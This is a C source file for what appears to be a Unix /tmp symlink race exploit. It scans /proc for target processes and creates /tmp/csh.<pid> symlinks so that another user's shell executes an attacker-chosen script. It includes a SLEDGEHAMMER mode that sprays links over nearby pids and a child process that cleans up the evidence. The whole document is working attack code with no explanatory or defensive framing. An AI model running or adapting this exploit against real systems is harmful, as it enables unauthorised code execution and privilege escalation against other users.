#include "init_race.h"

int main(int argc, char *argv[]){
  extern char *optarg;
  char *user=NULL;
  char *filename=NULL;
  int c, fd, ret, pid, i, fMadeLink;
  struct stat statStruct, statStruct2, targetStat, fakeStatStruct, cleanUpStat;
  DIR *dirHandle;
  struct dirent *dirStruct;
  struct passwd *pwStruct;
  uid_t targetUid;
  pid_t parent, topPid, childPid;
  FILE *fProcstat;
  char target[256], commandName[16], nameHolder[256];

  while ((c = getopt(argc, argv, "u:f:")) != EOF){
    switch (c) {
      case 'u':
        user = optarg;
        break;
      case 'f':
        filename = optarg;
        break;
      default:
        usage(argv[0]);
    }
  }

  if (user){
    pwStruct = (struct passwd *)getpwnam(user);
    if (!pwStruct){
      perror("getpwnam: ");
      exit(1);
    }
    targetUid = pwStruct->pw_uid;
  }

  if (!filename){
    printf("please specify file to have executed via -f flag\n");
    exit(1);
  }

  fd = open(filename, O_RDONLY);
  if (fd == -1){
    printf("could not open %s\nexiting...\n", filename);
    perror("open: ");
    exit(1);
  }

  ret = fstat(fd, &fakeStatStruct);
  if (ret != 0){
    printf("problem stating %s\nexiting...\n", filename);
    perror("fstat: ");
    exit(1);
  }

  if ( (fakeStatStruct.st_mode & S_IWUSR) || 
       (fakeStatStruct.st_mode & S_IWGRP) ||
       (fakeStatStruct.st_mode & S_IWOTH) ){
    printf("incorrect permissions on target script... modifying...\n");
    if (fchmod(fd, S_IRUSR|S_IRGRP|S_IROTH)){
      perror("fchmod: ");
      exit(1);
    }
    fstat(fd, &fakeStatStruct); /* refresh the atime */
  }

  close(fd);

  ret = stat(WATCHFILE, &statStruct);
  if (ret != 0){
    printf("problem stating %s\nexiting...", WATCHFILE);
    perror("stat: ");
    exit(1);
  }
 
  dirHandle = opendir("/proc");
  if (!dirHandle) {
    printf("could not open /proc\nexiting...");
    perror("opendir: ");
    exit(1);
  }

  topPid = getpid();

  rewinddir(dirHandle);

  while (1) {
    stat(WATCHFILE, &statStruct2);
    if (statStruct.st_atime < statStruct2.st_atime){
      printf(".");
      stat(WATCHFILE, &statStruct); /* prime for next time */
      while ( (dirStruct = readdir(dirHandle)) != NULL) {
        if (strIsNum(dirStruct->d_name, strlen(dirStruct->d_name)) ){
          snprintf(target, sizeof(target), "%s/%s/%s", 
                   PROCDIR, dirStruct->d_name, "stat");
          fProcstat = fopen(target, "r");
          if (fProcstat){
            fscanf(fProcstat, "%d%s", &pid, commandName);

            if (strcmp(PROC_CMP, commandName) == 0){

              if (user) { /* we are looking for a particular user */
                stat(target, &targetStat); 
                if (targetUid != targetStat.st_uid)
                  break;
              } /* end if (user) { */

#ifdef SLEDGEHAMMER 
              for ( i = pid ; i < (pid + 10) ; i++ ) {
                snprintf(nameHolder, sizeof(nameHolder), "/tmp/csh.%d", i);
                symlink(filename, nameHolder);
              } /* end for ( i= ... */
#else
              snprintf(nameHolder, sizeof(nameHolder), "/tmp/csh.%d", pid);
              symlink(filename, nameHolder);
#endif
              fMadeLink++;
              if (fMadeLink) { 
                parent = fork();

                /* the child */
                if (!parent) {
                  while (1) {
                    stat(filename, &cleanUpStat);
                    if (fakeStatStruct.st_atime < cleanUpStat.st_atime) {
                      unlink(nameHolder); 
                      exit(0);
                    }
                  }
                }
                else {
                  childPid = waitpid(-1, &ret, WNOHANG|WUNTRACED);
                  if (WIFEXITED(ret)){
                    parent = 0;
                    fMadeLink = 0;
                    stat(filename, &fakeStatStruct);
                  }
                }
              }
                
                      
            } /* end if strcmp(PROC_CMP */

          } /* end if (fProcstat){ */

        } /* end if(strIsNum... */

      } /* end while(dirent ... */

      rewinddir(dirHandle);
    } /* end if (statStruct.st_atime ... */
    
  } /* end while (1) { */

} 

#ifdef OUT
void usage(char *proggie){
  char *ptr;

  ptr = (char *)strrchr(proggie, '/');
  if (ptr)
    ptr++;
  else
    ptr = proggie;

  printf("Usage: %s [-u uid] -f filename\n", ptr);
  printf("       -u uid      user ID to target\n");
  printf("       -f filename file to link to (full path required)\n");
}
 

int strIsNum(char *string, int len){
  int i;

  for (i=0 ; i < len ; i++){
    if (!isdigit(string[i])){
      return(0);
    }
  }
  return(1);
}
#endif
